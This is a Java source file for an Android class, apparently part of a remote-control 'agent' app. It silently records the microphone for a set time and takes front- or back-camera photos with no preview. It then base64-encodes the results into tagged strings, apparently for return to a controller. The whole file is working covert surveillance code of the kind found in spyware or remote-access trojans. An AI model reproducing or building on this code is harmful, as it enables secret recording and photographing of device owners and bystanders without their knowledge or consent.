package com.zynremote.agent;

import android.content.Context;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import java.io.File;
import java.io.FileInputStream;
import java.util.Arrays;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

public class MediaHelper {

    private static volatile String cameraResult = null;

    public static String recordMic(Context ctx, int seconds) {
        try {
            File out = new File(ctx.getCacheDir(), "rec.m4a");
            MediaRecorder rec = new MediaRecorder();
            rec.setAudioSource(MediaRecorder.AudioSource.MIC);
            rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            rec.setOutputFile(out.getAbsolutePath());
            rec.prepare();
            rec.start();
            Thread.sleep(seconds * 1000L);
            rec.stop();
            rec.release();

            long size = out.length();
            byte[] data = new byte[(int) size];
            FileInputStream fis = new FileInputStream(out);
            fis.read(data);
            fis.close();
            out.delete();

            String b64 = Base64.encodeToString(data, Base64.NO_WRAP);
            return "AUDIO|mic_" + seconds + "s.m4a|" + b64;
        } catch (Throwable t) {
            return "error mic: " + t.getMessage();
        }
    }

    public static String takePhoto(Context ctx, boolean front) {
        try {
            CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
            if (cm == null) return "no camera manager";

            String camId = null;
            for (String id : cm.getCameraIdList()) {
                android.hardware.camera2.CameraCharacteristics c = cm.getCameraCharacteristics(id);
                Integer facing = c.get(android.hardware.camera2.CameraCharacteristics.LENS_FACING);
                if (facing == null) continue;
                if (front && facing == android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT) {
                    camId = id; break;
                }
                if (!front && facing == android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK) {
                    camId = id; break;
                }
            }
            if (camId == null) return "camera not found";

            final String finalCamId = camId;
            cameraResult = null;
            final CountDownLatch latch = new CountDownLatch(1);

            final HandlerThread ht = new HandlerThread("cam");
            ht.start();
            final Handler h = new Handler(ht.getLooper());
            final ImageReader reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);

            reader.setOnImageAvailableListener(r -> {
                try {
                    Image img = r.acquireLatestImage();
                    java.nio.ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] data = new byte[buf.remaining()];
                    buf.get(data);
                    img.close();
                    String b64 = Base64.encodeToString(data, Base64.NO_WRAP);
                    cameraResult = "PHOTO|" + (front ? "front" : "back") + ".jpg|" + b64;
                    latch.countDown();
                    ht.quitSafely();
                } catch (Throwable t) {
                    cameraResult = "error: " + t.getMessage();
                    latch.countDown();
                }
            }, h);

            cm.openCamera(finalCamId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice cam) {
                    try {
                        CaptureRequest.Builder b = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        b.addTarget(reader.getSurface());
                        cam.createCaptureSession(Arrays.asList(reader.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(CameraCaptureSession s) {
                                    try { s.capture(b.build(), null, h); }
                                    catch (Throwable t) {
                                        cameraResult = "capture error: " + t.getMessage();
                                        latch.countDown();
                                    }
                                }
                                @Override
                                public void onConfigureFailed(CameraCaptureSession s) {
                                    cameraResult = "config failed";
                                    latch.countDown();
                                }
                            }, h);
                    } catch (Throwable t) {
                        cameraResult = "error: " + t.getMessage();
                        latch.countDown();
                    }
                }
                @Override public void onDisconnected(CameraDevice c) { c.close(); }
                @Override public void onError(CameraDevice c, int e) {
                    c.close();
                    cameraResult = "camera error " + e;
                    latch.countDown();
                }
            }, h);

            latch.await(10, TimeUnit.SECONDS);
            return cameraResult != null ? cameraResult : "timeout";
        } catch (Throwable t) {
            return "error photo: " + t.getMessage();
        }
    }
}
